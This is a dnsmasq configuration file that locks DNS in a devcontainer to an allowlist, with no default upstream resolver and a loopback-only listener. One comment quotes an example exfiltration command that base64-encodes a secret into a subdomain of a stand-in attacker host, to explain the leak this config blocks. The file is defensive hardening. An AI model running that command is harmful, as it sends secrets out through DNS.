# dnsmasq — base config (Phase 1).
# Per-host server= and ipset= rules are GENERATED at boot from
# /etc/devcontainer-firewall/domains.txt + domains.local.txt by init-firewall.sh,
# and loaded via an additional `--conf-file` passed on the command line.

# Listen only on loopback — this resolver is not exposed to other containers
listen-address=127.0.0.53
bind-interfaces

# Don't read system resolv.conf or /etc/hosts (we control everything explicitly)
no-resolv
no-hosts

# No default upstream — non-allowlisted queries return REFUSED, so a
# subdomain-encoded payload (`dig $(base64 secret).attacker.com`) cannot
# leak via Docker DNS → host DNS → public DNS hierarchy (gap #9 of the
# v1 adversarial validation). Sibling Docker peers (claude-bridge etc.)
# are resolved by per-host `server=/<name>/127.0.0.11` lines emitted at
# boot from ports.txt ; host.docker.internal is resolved by
# the ollama block's `host-record=` directive — both injected by
# init-firewall.sh into the generated dnsmasq-domains.conf.

# Cache size — slight perf boost for repeated resolutions
cache-size=1000
